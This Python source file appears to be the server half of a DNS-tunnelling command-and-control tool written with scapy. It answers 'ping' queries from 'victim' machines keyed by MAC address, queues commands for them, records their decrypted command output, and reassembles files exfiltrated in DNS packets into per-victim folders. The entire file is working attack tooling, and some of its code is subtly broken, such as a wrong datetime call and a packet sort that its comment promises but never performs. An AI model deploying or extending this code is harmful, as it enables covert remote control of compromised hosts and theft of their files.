"""Process a given packet
"""
import os
import datetime

from scapy.all import *
from collections import namedtuple
from operator import attrgetter

from utils.request_type import RequestType
from utils.data_req_type import DataRequestType
from utils.mac import Mac
from utils.consts import log, PacketData, BROADCAST_MAC, SECRET
from utils.encrypt import Encrypter
from command.cmdparser import CommandParser

class DataReceiver():

    def __init__(self, rel_path, cmd_file, queue, config):
        self.cmd_parser = CommandParser(config)
        self.rel_path = rel_path
        self.cmd_file = cmd_file
        self.queue = queue
        self.config = config

        self.file_transfer = dict()

    def parse(self, pkt):
        # Check qtype field to delineate type of given packet
        if not pkt.haslayer(DNSQR):
            return

        # print(pkt.show())

        if pkt.getlayer(DNSQR).qtype == RequestType.PING:
            self._receive_ping(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.DATA:
            self._receive_data(pkt)
        elif pkt.getlayer(DNSQR).qtype == RequestType.RECPT:
            self._receive_recpt(pkt)

    def _receive_ping(self, pkt):
        """Handle when the client sends a request to ping the server for a command to run
        
        Arguments:
            pkt {Ether} -- packet sent from the client
        """

        # Fetch given command that should be sent to the client
        log('DataReceiver', '_receive_ping', 'Received ping packet')
        victim_mac = Mac(pkt.getlayer(Ether).dst)

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == BROADCAST_MAC:
            return

        # If client connecting for first time, create new dir for it
        victim_dir = self.rel_path + str(victim_mac)
        if not os.path.exists(victim_dir):
            self._init_victim_dir(victim_dir)

        pkts = self.cmd_parser.parse(victim_mac, pkt, victim_dir, self.cmd_file)

        # Send packets back to victim
        for p in pkts:
            self.queue.enqueue(p)
        

    def _receive_data(self, pkt):
        """Handle processing data corresponding to file transfers
        
        Arguments:
            pkt {Ether} -- packet that was sent by the client
        """

        log('DataReceiver', '_receive_data', 'Received data packet')
        victim_mac = Mac(pkt.getlayer(Ether).src)

        victim_dir = self.rel_path + str(victim_mac)
        if not os.path.exists(victim_dir):
            log('DataReceiver', '_receive_data', 'Unknown host.')
            return

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == BROADCAST_MAC:
            return

        # Process packets
        dns_layer = pkt.getlayer(DNS)
        dnsqr_layer = pkt.getlayer(DNSQR)
        fields = dnsqr_layer.qname[:-1].split('.') # There is a trailing period
        filename = fields[-2] + '.' + fields[-1]
        key = str(victim_mac) + '@' + filename

        self._handle_data_pkts(pkt, dns_layer, dnsqr_layer, filename, key, victim_mac)


    def _receive_recpt(self, pkt):
        """Process RECPT request from the client and writes out result of command to file
        
        Arguments:
            pkt {Ether} -- packet sent from client
        """
        log('DataReceiver', '_receive_recpt', 'Received receipt packet')

        # Scapy concats the rdata together, even if it exceeds 255 bytes
        # test = pkt.getlayer(DNSRR)
        # print(test.rdata)

        # Create a new file with current timestamp with output of command
        victim_mac = Mac(pkt.getlayer(Ether).src)

        # Ignore broadcast since Ether() is sent as empty
        if str(victim_mac) == BROADCAST_MAC:
            return

        self._write_cmd_result(pkt, victim_mac)

    def _init_victim_dir(self, victim_dir):
        """Initializes the victim directory with directories for inputting commands, command outputs, and file outputs
        
        Arguments:
            victim_dir {[type]} -- [description]
        """
        os.mkdir(victim_dir)
        os.mkdir(victim_dir + '/input')
        os.mkdir(victim_dir + '/output')
        os.mkdir(victim_dir + '/files')

    def _write_cmd_result(self, pkt, victim_mac):
        """Writes resulting payload from packet to file
        """
        timestamp = datetime.now().isoformat()
        with open(self.rel_path + str(victim_mac) + '/output/' + timestamp + '.txt', 'w') as f:
            dnsrr_layer = pkt.getlayer(DNSRR)
            command = dnsrr_layer.rrname[:-1]
            f.write(Encrypter(command, SECRET).decrypt() + '\n') # Command associated with output
            f.write(dnsrr_layer.rdata)

    def _handle_data_pkts(self, pkt, dns_layer, dnsqr_layer, filename, key, victim_mac):
        if dns_layer == None or dnsqr_layer == None:
            return

        # Determine if it is a head, body, or tail packet
        if dns_layer.opcode == DataRequestType.HEAD:
            # Create entry, append data
            dnsrr_layer = pkt.getlayer(DNSRR)
            dns_layer = pkt.getlayer(DNS)
            self.file_transfer[key] = [PacketData(0, dnsrr_layer.rdata)]

        elif dns_layer.opcode == DataRequestType.NORMAL:
            dnsrr_layer = pkt.getlayer(DNSRR)
            dns_layer = pkt.getlayer(DNS)
            self.file_transfer[key].append(PacketData(dnsqr_layer.qclass, dnsrr_layer.rdata))
        elif dns_layer.opcode == DataRequestType.TAIL:
            dnsrr_layer = pkt.getlayer(DNSRR)
            dns_layer = pkt.getlayer(DNS)
            self.file_transfer[key].append(PacketData(dnsqr_layer.qclass, dnsrr_layer.rdata))

            # Sort packets since they may be out of order

            # Write to file from buffer
            victim_dir = self.rel_path + str(victim_mac)
            with open(victim_dir + '/files/' + filename, 'wb+') as f:
                buf = ''
                log('DataReceiver', '_handle_data_pkts', 'Writing %s to file'.format(self.file_transfer[key]))
                print(self.file_transfer[key])
                for packet in self.file_transfer[key]:
                    buf += packet.data

                f.write(buf)